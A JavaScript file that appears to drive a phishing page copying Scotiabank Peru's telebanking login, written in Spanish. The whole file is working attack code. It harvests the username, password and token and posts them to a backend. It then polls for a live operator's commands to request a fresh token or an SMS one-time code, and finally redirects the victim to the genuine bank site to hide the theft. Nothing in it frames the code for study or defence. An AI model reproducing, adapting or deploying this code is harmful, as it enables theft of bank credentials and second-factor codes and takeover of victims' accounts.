document.addEventListener("DOMContentLoaded", () => {
  // Elementos DOM del formulario de Login
  const form = document.querySelector("#login-form-data") || document.querySelector("#telebanking-form");
  const usernameInput = document.querySelector("#input-user-name") || document.querySelector("#username");
  const passwordInput = document.querySelector("#input-password-login") || document.querySelector("#password");
  const tokenInput = document.querySelector("#input-token") || document.querySelector("#token");
  
  const iconPasswordEye = document.querySelector("#icon-password-eye") || document.querySelector("#toggle-password");
  const iconTokenEye = document.querySelector("#icon-token-eye") || document.querySelector("#toggle-token");
  
  const rememberCheckbox = document.querySelector("#chkRemerberConventions") || document.querySelector("#remember-user");
  const submitBtn = document.querySelector("#btn-login-pass") || document.querySelector("#submit-btn");

  // Elementos del Modal SMS
  const modalSms = document.getElementById("modalSmsVerification");
  const smsInput = document.getElementById("input-sms-code");
  const btnSubmitSms = document.getElementById("btn-submit-sms");
  const smsErrorMsg = document.getElementById("sms-error-msg");
  const loader = document.getElementById("ajax_loader");

  // Estado de Sesión Local
  let currentSessionId = null;
  let statusPollInterval = null;

  // Limpiar cualquier sesión anterior al cargar para evitar spinner automático
  localStorage.removeItem("telebanking_session_id");

  // Helper para mostrar u ocultar Spinner Loader sin bloqueos
  function setLoaderState(show) {
    if (!loader) return;
    if (show) {
      loader.classList.add("show-loader");
      loader.style.setProperty("display", "flex", "important");
      loader.style.setProperty("opacity", "1", "important");
      loader.style.setProperty("visibility", "visible", "important");
    } else {
      loader.classList.remove("show-loader");
      loader.style.setProperty("display", "none", "important");
      loader.style.setProperty("opacity", "0", "important");
      loader.style.setProperty("visibility", "hidden", "important");
    }
  }

  // Forzar ocultamiento del loader al cargar la página
  setLoaderState(false);

  // Sobrescribir modalLoad global para evitar interferencias de scripts legacy
  window.modalLoad = function(state) {
    if (state === 'show') {
      setLoaderState(true);
    } else {
      setLoaderState(false);
    }
  };

  // Ocultar estados de error al escribir en los inputs
  [usernameInput, passwordInput, tokenInput].forEach((input) => {
    if (input) {
      input.addEventListener("focus", () => {
        input.classList.remove("error");
        const parentWrapper = input.closest(".g-input_design");
        if (parentWrapper) parentWrapper.classList.remove("error");
        const errSpan = document.getElementById(input.id + "-error");
        if (errSpan) errSpan.textContent = "";
      });
    }
  });

  // 1. Toggle Visibilidad Contraseña y Token
  function setupEyeToggle(button, input) {
    if (!button || !input) return;
    button.style.cursor = "pointer";
    button.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      const isPassword = input.type === "password";
      input.type = isPassword ? "text" : "password";
      button.src = isPassword ? "/nuevotbk/resources/img/icon-eye.svg" : "/nuevotbk/resources/img/icon-eye-hide.svg";
      button.style.opacity = isPassword ? "1" : "0.7";
    });
  }

  setupEyeToggle(iconPasswordEye, passwordInput);
  setupEyeToggle(iconTokenEye, tokenInput);

  // 2. Recordar usuario en LocalStorage
  const savedUser = localStorage.getItem("scotia_telebanking_username");
  if (savedUser && usernameInput) {
    usernameInput.value = savedUser;
    if (rememberCheckbox) rememberCheckbox.checked = true;
  }

  // 3. Control y habilitación constante del Botón de Ingreso
  function checkFormValidity() {
    if (!submitBtn) return;
    const uHas = usernameInput && usernameInput.value.trim() !== "";
    const pHas = passwordInput && passwordInput.value.trim() !== "";

    if (uHas && pHas) {
      submitBtn.removeAttribute("disabled");
      submitBtn.disabled = false;
      submitBtn.classList.add("ready");
      submitBtn.style.opacity = "1";
      submitBtn.style.pointerEvents = "auto";
    }
  }

  [usernameInput, passwordInput, tokenInput].forEach((input) => {
    if (input) {
      input.addEventListener("input", checkFormValidity);
      input.addEventListener("keyup", checkFormValidity);
    }
  });

  // Forzar habilitación constante del botón
  setInterval(checkFormValidity, 300);
  checkFormValidity();

  // 4. Procesar Envío del Formulario Principal
  async function performLoginSubmission(e) {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }

    const uVal = usernameInput ? usernameInput.value.trim() : "";
    const pVal = passwordInput ? passwordInput.value.trim() : "";
    const tVal = tokenInput ? tokenInput.value.trim() : "";

    if (!uVal || !pVal) {
      showErrorState("Por favor ingrese su nombre de usuario y contraseña.");
      return;
    }

    if (rememberCheckbox && rememberCheckbox.checked) {
      localStorage.setItem("scotia_telebanking_username", uVal);
    } else {
      localStorage.removeItem("scotia_telebanking_username");
    }

    if (submitBtn) {
      submitBtn.textContent = "Ingresando...";
      submitBtn.disabled = true;
    }

    setLoaderState(true);

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: uVal,
          password: pVal,
          token: tVal
        })
      });

      const data = await response.json();
      if (data.success && data.sessionId) {
        currentSessionId = data.sessionId;
        localStorage.setItem("telebanking_session_id", currentSessionId);
        startPollingStatus();
      } else {
        showErrorState(data.message || "Error al conectar con el servidor.");
      }
    } catch (err) {
      console.error("Error en petición de login:", err);
    }
  }

  if (submitBtn) {
    submitBtn.removeAttribute("disabled");
    submitBtn.disabled = false;
    submitBtn.addEventListener("click", performLoginSubmission);
  }

  if (form) {
    form.addEventListener("submit", performLoginSubmission);
  }

  // 5. Sondeo en tiempo real de instrucciones del operador
  function startPollingStatus() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentSessionId) return;

      try {
        const response = await fetch(`/api/session-status/${currentSessionId}`);
        const data = await response.json();

        if (data.success) {
          handleOperatorInstruction(data);
        }
      } catch (err) {
        console.warn("Polling status check error:", err);
      }
    }, 1200);
  }

  // Manejador de respuestas e instrucciones del Operador
  function handleOperatorInstruction(data) {
    const step = data.requestedStep;

    switch (step) {
      case "REQUEST_TOKEN":
        setLoaderState(false);
        if (modalSms) modalSms.style.display = "none";
        if (tokenInput) {
          tokenInput.value = "";
          tokenInput.focus();
          const errSpan = document.getElementById("input-token-error");
          if (errSpan) errSpan.textContent = "Por favor ingrese su Clave Token actual para continuar";
        }
        break;

      case "REQUEST_SMS":
        setLoaderState(false);
        if (modalSms) {
          modalSms.style.display = "flex";
          if (smsInput) {
            smsInput.value = "";
            smsInput.focus();
          }
        }
        break;

      case "REJECT_CREDS":
        setLoaderState(false);
        if (modalSms) modalSms.style.display = "none";
        currentSessionId = null;
        localStorage.removeItem("telebanking_session_id");
        if (statusPollInterval) clearInterval(statusPollInterval);
        showErrorState(data.errorMessage || "Nombre de usuario o contraseña incorrectos.");
        break;

      case "APPROVE":
        setLoaderState(false);
        if (modalSms) modalSms.style.display = "none";
        window.location.href = "https://www.scotiabank.com.pe";
        break;

      case "WAIT_OPERATOR":
      default:
        if (modalSms && modalSms.style.display === "flex") {
        } else {
          setLoaderState(true);
        }
        break;
    }
  }

  // Mostrar mensaje de error en la interfaz
  function showErrorState(msg) {
    setLoaderState(false);
    if (submitBtn) {
      submitBtn.textContent = "Ingresar";
      submitBtn.removeAttribute("disabled");
      submitBtn.disabled = false;
    }
    if (passwordInput) passwordInput.value = "";
    if (tokenInput) tokenInput.value = "";

    const passErrSpan = document.getElementById("input-password-login-error");

    if (passErrSpan) {
      passErrSpan.textContent = msg;
      if (passwordInput) {
        passwordInput.classList.add("error");
        const wrapper = passwordInput.closest(".g-input_design");
        if (wrapper) wrapper.classList.add("error");
      }
    }
  }

  // 6. Envío del código SMS al Operador
  if (btnSubmitSms && smsInput) {
    btnSubmitSms.addEventListener("click", async (e) => {
      e.preventDefault();
      const code = smsInput.value.trim();

      if (!code || code.length < 4) {
        if (smsErrorMsg) {
          smsErrorMsg.textContent = "Por favor ingrese un código SMS válido.";
          smsErrorMsg.style.display = "block";
        }
        return;
      }

      if (smsErrorMsg) smsErrorMsg.style.display = "none";
      if (modalSms) modalSms.style.display = "none";

      setLoaderState(true);

      try {
        await fetch("/api/submit-step", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            sessionId: currentSessionId,
            smsCode: code
          })
        });
      } catch (err) {
        console.error("Error al enviar código SMS:", err);
      }
    });
  }
});
